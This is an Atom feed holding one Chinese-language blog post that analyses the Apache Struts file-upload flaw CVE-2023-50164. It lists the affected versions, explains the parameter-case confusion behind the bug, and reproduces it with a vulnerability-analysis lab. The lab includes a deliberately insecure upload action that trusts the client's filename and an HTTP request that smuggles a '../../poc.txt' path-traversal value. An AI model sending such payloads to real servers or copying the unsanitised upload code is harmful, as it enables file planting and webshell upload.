<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://AisyIE.github.io</id>
    <title>AisIE</title>
    <updated>2025-02-22T08:27:09.838Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://AisyIE.github.io"/>
    <link rel="self" href="https://AisyIE.github.io/atom.xml"/>
    <subtitle>Everthing for Eille.</subtitle>
    <logo>https://AisyIE.github.io/images/avatar.png</logo>
    <icon>https://AisyIE.github.io/favicon.ico</icon>
    <rights>All rights reserved 2025, AisIE</rights>
    <entry>
        <title type="html"><![CDATA[CVE-2023-50164]]></title>
        <id>https://AisyIE.github.io/post/cve-2023-50164/</id>
        <link href="https://AisyIE.github.io/post/cve-2023-50164/">
        </link>
        <updated>2024-03-04T14:49:43.000Z</updated>
        <content type="html"><![CDATA[<h2 id="漏洞描述">漏洞描述</h2>
<p>Apache Struts 是一个开源的、用于构建企业级 Java Web 应用的 MVC 框架。2023 年 12 月，官方披露 CVE-2023-50164 Apache Struts 文件上传漏洞。<br>
攻击者可以通过污染相关上传参数导致目录遍历，若在具体代码环境中允许上传危险后缀文件（例如 jsp 文件），则攻击者可能结合该目录遍历漏洞，可能导致上传 webshell 至可解析目录，执行任意代码。</p>
<h2 id="影响版本">影响版本</h2>
<p>Struts 2.0.0 - Struts 2.3.37<br>
Struts 2.5.0- Struts 2.5.32<br>
Struts 6.0.0- Struts 6.3.0</p>
<h2 id="漏洞原理">漏洞原理</h2>
<p>在修复前的 Struts2 中，org.apache.struts2.dispatcher.HttpParameters 处理参数时是大小写敏感的，org.apache.struts2.dispatcher.HttpParameters#appendAll 被以下几个方法调用，org.apache.struts2.interceptor.FileUploadInterceptor#intercept 使用该 appendAll 添加请求参数。<br>
<img src="https://raw.githubusercontent.com/AisyIE/BlogPhoto/main/images/20240107120821.png" alt="20240107120821" loading="lazy"><br>
首先，我们有这样的文件上传请求包<br>
<img src="https://raw.githubusercontent.com/AisyIE/BlogPhoto/main/images/20240107120853.png" alt="20240107120853" loading="lazy"><br>
在文件上传时看其中参数的内容为<br>
<img src="https://raw.githubusercontent.com/AisyIE/BlogPhoto/main/images/20240107120920.png" alt="20240107120920" loading="lazy"><br>
<img src="https://raw.githubusercontent.com/AisyIE/BlogPhoto/main/images/20240107120941.png" alt="20240107120941" loading="lazy"><br>
注意这里，在请求时我们提供了一个 uploadFileName，HttpParameters 同样也会将其读取（但不将其视为文件）。<br>
参数污染的关键就在于这，HttpParameters 同时保存了 uploadFileName 和 UploadFileName<br>
而在后续的参数传递中，HttpParameters 的参数顺序<br>
<img src="https://raw.githubusercontent.com/AisyIE/BlogPhoto/main/images/20240107121015.png" alt="20240107121015" loading="lazy"><br>
会变成<br>
<img src="https://raw.githubusercontent.com/AisyIE/BlogPhoto/main/images/20240107121041.png" alt="20240107121041" loading="lazy"><br>
HttpParameters 的 HashMap 的顺序存在随机性（有的文章会写其顺序是小写在前大写在后，不太准确），但是最后放入 acceptableParameters 的 TreeMap 时会保证一个严格的前后顺序是大写在前小写在后，修复后的 HttpParameters 不再关注大小写问题，只会分析出三个参数，不影响后续传输到 acceptableParameters。<br>
<img src="https://raw.githubusercontent.com/AisyIE/BlogPhoto/main/images/20240107121108.png" alt="20240107121108" loading="lazy"><br>
继续说未修补前的问题，在后续的处理中会根据 acceptableParameters 中的参数调用对应的 setter 方法给 action 设置参数，在对应的 action 下断点<br>
<img src="https://raw.githubusercontent.com/AisyIE/BlogPhoto/main/images/20240107121131.png" alt="20240107121131" loading="lazy"><br>
<img src="https://raw.githubusercontent.com/AisyIE/BlogPhoto/main/images/20240107121156.png" alt="20240107121156" loading="lazy"><br>
对应的 action 的 setter 方法被调用了两次，并且是按照 acceptableParameters 的顺序进行，因而导致的结果就是后面的小写 uploadfilename 覆盖了前面的 Uploadfilename，如果在二次开发中程序员不对上传的文件名做重命名，就会导致漏洞产生。</p>
<h2 id="漏洞复现">漏洞复现</h2>
<p>因为该漏洞与二次开发有关，因而搭建漏洞环境需要注意<br>
<img src="https://raw.githubusercontent.com/AisyIE/BlogPhoto/main/images/20240107121240.png" alt="20240107121240" loading="lazy"><br>
结构如图<br>
upload.java</p>
<pre><code class="language-java">package org.vicarius.example;

import com.opensymphony.xwork2.ActionSupport;
import java.io.File;
import org.apache.commons.io.FileUtils;

public class Upload extends ActionSupport {
    private File upload;
    private String uploadFileName;
    private String uploadContentType;

    // Custom upload logic
    public String execute() throws Exception {
        if (uploadFileName != null) {
            try {
                // Specify the directory where files will be uploaded
                String uploadDirectory = System.getProperty(&quot;user.dir&quot;) + &quot;/uploads/&quot;;

                // Create the destination file
                File destFile = new File(uploadDirectory, uploadFileName);

                // Copy the uploaded file to the destination
                FileUtils.copyFile(upload, destFile);

                // Add message to reflect the exact upload path on the frontend
                addActionMessage(&quot;File uploaded successfully to &quot; + destFile.getAbsolutePath());

                return SUCCESS;
            } catch (Exception e) {
                addActionError(e.getMessage());
                e.printStackTrace();
                return ERROR;
            }
        } else {
            return INPUT;
        }
    }

    // Getters and setters
    public File getUpload() {
        return upload;
    }

    public void setUpload(File upload) {
        this.upload = upload;
    }

    public String getUploadFileName() {
        return uploadFileName;
    }

    public void setUploadFileName(String uploadFileName) {
        this.uploadFileName = uploadFileName;
    }

    public String getUploadContentType() {
        return uploadContentType;
    }

    public void setUploadContentType(String uploadContentType) {
        this.uploadContentType = uploadContentType;
    }

}
</code></pre>
<p>配置 Struts 文件</p>
<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;
&lt;!DOCTYPE struts PUBLIC
&quot;-//Apache Software Foundation//DTD Struts Configuration 2.5//EN&quot;
&quot;http://struts.apache.org/dtds/struts-2.5.dtd&quot;&gt;
&lt;struts&gt;
  &lt;constant name=&quot;struts.enable.DynamicMethodInvocation&quot; value=&quot;false&quot;/&gt;
  &lt;constant name=&quot;struts.devMode&quot; value=&quot;true&quot;/&gt;

  &lt;package name=&quot;default&quot; namespace=&quot;/&quot; extends=&quot;struts-default&quot;&gt;

    &lt;default-action-ref name=&quot;index&quot;/&gt;

    &lt;action name=&quot;index&quot;&gt;
      &lt;result type=&quot;redirectAction&quot;&gt;
        &lt;param name=&quot;actionName&quot;&gt;upload&lt;/param&gt;
      &lt;/result&gt;
    &lt;/action&gt;

    &lt;action name=&quot;upload&quot; class=&quot;org.vicarius.example.Upload&quot;&gt;
      &lt;result name=&quot;input&quot;&gt;WEB-INF/upload.jsp&lt;/result&gt;
      &lt;result name=&quot;error&quot;&gt;WEB-INF/error.jsp&lt;/result&gt;
      &lt;result name=&quot;success&quot;&gt;WEB-INF/success.jsp&lt;/result&gt;
    &lt;/action&gt;

  &lt;/package&gt;
&lt;/struts&gt;
</code></pre>
<pre><code class="language-http">POST /upload_war_exploded/upload.action;jsessionid=602ABD53ABD53690211EADD7C6487196 HTTP/1.1
Host: localhost:8081
Content-Length: 303
Cache-Control: max-age=0
sec-ch-ua:
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: &quot;&quot;
Upgrade-Insecure-Requests: 1
Origin: http://localhost:8081
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryUSyiGf3oDxBGA1FZ
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost:8081/upload_war_exploded/upload.action
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=602ABD53ABD53690211EADD7C6487196
Connection: close

------WebKitFormBoundaryUSyiGf3oDxBGA1FZ
Content-Disposition: form-data; name=&quot;Upload&quot;; filename=&quot;test.txt&quot;
Content-Type: text/plain

test

------WebKitFormBoundaryUSyiGf3oDxBGA1FZ
Content-Disposition: form-data; name=&quot;uploadFileName&quot;;

../../poc.txt
------WebKitFormBoundaryUSyiGf3oDxBGA1FZ--
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/AisyIE/BlogPhoto/main/images/20240107121444.png" alt="20240107121444" loading="lazy"></figure>
<h2 id="其他注意到的事项">其他注意到的事项</h2>
<p>一个注意事项：该漏洞并不是完全由框架产生的，在 JakartaMultiPartRequest#processUpload 的逻辑中，上传的内容路径并不可控，文件上传参数存储在 Commons Fileupload 库创建的临时文件中，文件名也不可控。<br>
在 FileUploadInterceptor#intercept 获取上传的文件名时会调用 JakartaMultiPartRequest#getCanonicalName 方法对路径穿越进行处理，因而不会在临时文件中造成穿越漏洞。</p>
<h2 id="参考文章">参考文章：</h2>
<p>https://trganda.github.io/notes/security/vulnerabilities/apache-struts/Apache-Struts-Remote-Code-Execution-Vulnerability-(-S2-066-CVE-2023-50164)<br>
https://paper.seebug.org/3086/#381<br>
https://xz.aliyun.com/t/13172</p>
]]></content>
    </entry>
</feed>